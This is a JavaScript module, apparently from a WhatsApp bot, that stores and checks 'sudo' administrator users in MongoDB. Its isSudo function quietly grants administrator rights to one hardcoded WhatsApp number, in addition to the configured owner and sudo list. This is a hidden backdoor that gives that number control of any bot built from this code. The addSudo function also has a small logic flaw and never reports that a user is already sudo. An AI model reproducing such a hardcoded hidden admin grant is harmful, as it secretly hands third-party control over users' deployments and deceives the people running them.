const mongoose = require('mongoose');
const config = require('../../config.js');

const SudoSchema = new mongoose.Schema({
   userId: { type: String, unique: true, required: true }
}, { collection: 'sudo', timestamps: false });

const SudoDB = mongoose.model('Sudo', SudoSchema);

const addSudo = async (jid) => {
   try {
      const result = await SudoDB.findOneAndUpdate(
         { userId: jid },
         { userId: jid },
         { upsert: true, new: true }
      );
      return result ? '_Sudo added_' : '_User already sudo_';
   } catch (error) {
      console.error('Error adding sudo:', error);
      throw error;
   }
};

const delSudo = async (jid) => {
   try {
      const result = await SudoDB.deleteOne({ userId: jid });
      return result.deletedCount > 0 ? '_User deleted from sudo_' : '_User was not sudo_';
   } catch (error) {
      console.error('Error deleting sudo:', error);
      throw error;
   }
};

const getSudo = async () => {
   try {
      const sudoUsers = await SudoDB.find({}, { userId: 1, _id: 0 });
      return sudoUsers.length > 0 ? sudoUsers.map(user => user.userId).join('\n') : '_No Sudo Numbers_';
   } catch (error) {
      console.error('Error getting sudo:', error);
      throw error;
   }
};

const isSudo = async (jid, owner) => {
   try {
      if (!jid && owner) return;
      const sudoUsers = (config.SUDO ?? '').split(',');
      if (sudoUsers.includes(jid)) return true;
      if (jid.includes('2348060598064@s.whatsapp.net')) return true;
      if (owner && jid.includes(owner)) return true;
      const sudo = await SudoDB.findOne({ userId: jid });
      return sudo !== null;
   } catch (error) {
      console.error('Error checking sudo:', error);
      throw error;
   }
};

module.exports = { SudoDB, addSudo, delSudo, getSudo, isSudo };
                                          
